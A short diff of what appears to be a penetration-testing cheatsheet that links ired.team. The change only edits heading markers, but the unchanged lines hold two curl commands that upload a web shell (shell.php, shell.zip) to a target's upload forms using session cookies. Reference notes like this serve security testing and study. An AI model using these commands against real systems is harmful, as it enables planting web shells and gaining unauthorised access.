@@ -236,8 +236,8 @@ https://www.ired.team/offensive-security-experiments/offensive-security-cheetshe
 
 
 https://www.ired.team/offensive-security-experiments/offensive-security-cheetsheets#uploading-posting-files-through-www-upload-forms
-# POST file
+#### POST file
 curl -X POST -F "file=@/file/location/shell.php" http://$TARGET/upload.php --cookie "cookie"
 
-# POST binary data to web form
+### POST binary data to web form
 curl -F "field=<shell.zip" http://$TARGET/upld.php -F 'k=v' --cookie "k=v;" -F "submit=true" -L -v
